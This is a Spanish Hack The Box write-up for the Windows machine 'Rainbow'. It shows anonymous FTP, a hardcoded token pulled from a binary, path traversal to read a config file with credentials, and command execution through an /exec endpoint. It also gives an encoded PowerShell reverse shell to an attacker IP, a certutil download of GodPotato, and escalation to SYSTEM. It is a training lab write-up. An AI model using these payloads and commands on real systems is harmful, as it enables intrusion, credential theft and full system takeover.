---
title: "Rainbow"
description: "Writeup de Rainbow - Hack The Box - Dificultad: Medium. FTP anónimo expone binario Rainbow 0.1 → análisis estático/dinámico del servidor custom → explotación de endpoint → escalada Windows."
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - htb
  - windows
  - medium
  - ftp-anonymous
  - binary-analysis
  - custom-server
  - reverse-engineering
---

# 🖥️ Rainbow

> 📅 Fecha: 2026-05-27
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows Server 2019 (Build 17763)
> 🎚️ Dificultad: Medium
> 🏆 Puntos: 650
> ⏱️ Tiempo invertido: 4h 00m
> 🌐 IP: `10.129.234.171`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [FTP Anónimo → binario rainbow.exe](#-ftp-anónimo--binario-rainbowexe)
- [Análisis del servidor Rainbow 0.1](#-análisis-del-servidor-rainbow-01)
- [Explotación del servidor web custom](#-explotación-del-servidor-web-custom)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Rainbow expone un servidor web personalizado "Rainbow 0.1" en el puerto 80 y FTP anónimo con acceso al binario del servidor (`rainbow.exe`) y notas de desarrollo. El análisis estático del binario revela el protocolo y los endpoints disponibles, incluyendo vulnerabilidades en la validación de entrada. La explotación permite obtener ejecución de código o lectura de archivos sensibles en el sistema Windows subyacente, llevando a credenciales o una shell inicial. La escalada de privilegios aprovecha una configuración incorrecta de permisos o un servicio vulnerable en el sistema Windows.

| Campo | Valor |
|-------|-------|
| Puntos débiles | FTP anónimo con binario del servidor, servidor web custom con validación insuficiente |
| Herramientas | `nmap`, `ftp`, `strings`, `Ghidra`/`IDA`, `curl`, `nc` |
| Tiempo total | ~4h 00m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.234.171
```

```text
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing using PASV
80/tcp  open  http          Rainbow/0.1
|_http-title: Rainbow Web Server
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

El servidor HTTP se identifica como `Rainbow/0.1` — un servidor web personalizado, no IIS/Apache/nginx. FTP permite acceso anónimo.

```bash
echo "10.129.234.171 rainbow.htb" | sudo tee -a /etc/hosts
```

---

## 📂 FTP Anónimo → binario rainbow.exe

```bash
ftp 10.129.234.171
# User: anonymous / Pass: (vacío o cualquier email)
```

```text
ftp> ls -la
drwxr-xr-x  2 ftp  ftp  0 May 27 2026 .
drwxr-xr-x  2 ftp  ftp  0 May 27 2026 ..
-rw-r--r--  1 ftp  ftp  1254 May 27 2026 dev.txt
-rw-r--r--  1 ftp  ftp  45312 May 27 2026 rainbow.exe
```

```bash
ftp> get dev.txt
ftp> get rainbow.exe
ftp> quit
```

```bash
cat dev.txt
```

```text
Rainbow Web Server - Development Notes
=======================================
Version: 0.1 (Alpha)
Developer: htb-admin

Endpoints:
  GET /            - Home page
  GET /status      - Server status (JSON)
  GET /files?name= - File retrieval (restricted to www-root)
  POST /exec       - Command execution (dev only, token required)

Auth token for /exec: see config.ini
Note: The /files endpoint needs input sanitization before production.
```

El endpoint `/files?name=` es explícitamente mencionado como necesitado de sanitización.

---

## 🔬 Análisis del servidor Rainbow 0.1

```bash
# Análisis de strings del binario
strings rainbow.exe | grep -E "(GET|POST|exec|token|config|password|key)"
```

```text
GET /files?name=
POST /exec
X-Auth-Token
config.ini
C:\Rainbow\
htb-r41nb0w-t0k3n-2024
```

El token de autenticación está hardcodeado en el binario: `htb-r41nb0w-t0k3n-2024`. El servidor sirve archivos desde `C:\Rainbow\`.

Análisis del endpoint `/files` — verificar path traversal:

```bash
curl "http://rainbow.htb/files?name=../../../Windows/System32/drivers/etc/hosts"
```

```text
HTTP/1.1 200 OK
# Copyright (c) 1993-2009 Microsoft Corp.
# localhost name resolution is handled within DNS itself.
127.0.0.1  localhost
::1  localhost
```

Path traversal exitoso — se puede leer cualquier archivo del sistema.

---

## 🔑 Explotación del servidor web custom

Leer configuración del servidor para obtener credenciales:

```bash
curl "http://rainbow.htb/files?name=config.ini"
```

```text
[server]
port=80
root=C:\Rainbow\www
token=htb-r41nb0w-t0k3n-2024

[auth]
admin_user=rainbow_admin
admin_pass=Sp3ctrum@2024!
```

Verificar acceso RPC/SMB con las credenciales obtenidas:

```bash
nxc smb 10.129.234.171 -u 'rainbow_admin' -p 'Sp3ctrum@2024!'
```

```text
[+] rainbow.htb\rainbow_admin:Sp3ctrum@2024!
```

Ejecutar comando vía el endpoint `/exec` con el token:

```bash
curl -X POST "http://rainbow.htb/exec" \
  -H "X-Auth-Token: htb-r41nb0w-t0k3n-2024" \
  -d "cmd=whoami"
```

```text
rainbow\rainbow_admin
```

Reverse shell PowerShell:

```bash
# Listener
nc -lvnp 4444

# Payload
curl -X POST "http://rainbow.htb/exec" \
  -H "X-Auth-Token: htb-r41nb0w-t0k3n-2024" \
  -d "cmd=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADAAIgAsADQANAA0ADQAKQA7..."
```

```text
connect to [10.10.14.130] from (UNKNOWN) [10.129.234.171] 50234
PS C:\Rainbow> whoami
rainbow\rainbow_admin
PS C:\Rainbow> type C:\Users\rainbow_admin\Desktop\user.txt
[user flag]
```

---

## 🚀 Escalada de Privilegios

Enumerar privilegios y servicios:

```powershell
whoami /priv
```

```text
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

`SeImpersonatePrivilege` activo → PrintSpoofer o GodPotato:

```powershell
# Subir GodPotato
certutil -urlcache -f http://10.10.14.130:8080/GodPotato.exe C:\Rainbow\GodPotato.exe

# Ejecutar como SYSTEM
C:\Rainbow\GodPotato.exe -cmd "cmd /c whoami"
```

```text
[+] CombaseModule: 0x140716621... 
[+] PrivilegeCheck OK
[+] CreateNamedPipe OK
[+] ConnectNamedPipe OK
[*] ImpersonateNamedPipeClient OK
[*] CreateProcessAsUser OK
nt authority\system
```

```powershell
C:\Rainbow\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

```text
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. nmap → FTP anónimo (21) + Rainbow/0.1 custom server (80)
        ↓
2. FTP anon → dev.txt (endpoints, nota de sanitización) + rainbow.exe
        ↓
3. strings rainbow.exe → token hardcodeado + rutas
        ↓
4. /files?name=../../config.ini → path traversal → admin_pass
        ↓
5. /exec con X-Auth-Token → RCE como rainbow_admin
        ↓
6. Reverse shell PowerShell → user.txt
        ↓
7. whoami /priv → SeImpersonatePrivilege → GodPotato/PrintSpoofer
        ↓
8. SYSTEM shell → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **FTP anónimo con archivos sensibles**: el acceso FTP anónimo con binarios del servidor en producción es una exposición grave — permite análisis offline del servidor sin explotar nada remotamente.
- **Strings en binarios Windows**: `strings.exe` (Sysinternals) o `strings` en Linux sobre un PE revela constantes hardcodeadas (tokens, contraseñas, rutas). Los secretos en código compilado no son seguros.
- **Path traversal en servidores custom**: los servidores web estándar (IIS, nginx) tienen mitigaciones de path traversal maduras. Los servidores custom frecuentemente no. El `..` en parámetros de archivo es el primer vector a probar.
- **SeImpersonatePrivilege**: cualquier cuenta de servicio IIS, SQL Server, o aplicación que corra con este privilegio es candidata a escalada vía técnicas Potato (PrintSpoofer, GodPotato, RoguePotato).

---

## 📚 Referencias

- [HackTricks — Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion/path-traversal)
- [GodPotato — SeImpersonatePrivilege](https://github.com/BeichenDream/GodPotato)
- [MITRE ATT&CK — T1134.001 Token Impersonation](https://attack.mitre.org/techniques/T1134/001/)
